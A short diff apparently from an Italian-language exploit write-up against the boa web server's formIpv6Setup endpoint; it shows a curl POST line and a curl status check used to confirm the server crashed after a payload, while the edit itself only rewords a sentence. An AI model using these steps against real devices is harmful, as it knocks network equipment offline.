@@ -276,5 +276,5 @@ curl -X POST 'http://<TARGET>/boafrm/formIpv6Setup' \
 
 curl -s -o /dev/null -w '%{http_code}\n' http://(TARGET)/login.htm
 
-;un codice HTTP diverso da 200, o l'assenza di risposta entro timeout, conferma che boa non sta piu' rispondendo sulla porta 80 dopo il payload.
+;un codice HTTP diverso da 200, o l'assenza di risposta entro il timeout, conferma che boa non sta piu' rispondendo sulla porta 80 dopo il payload.
 
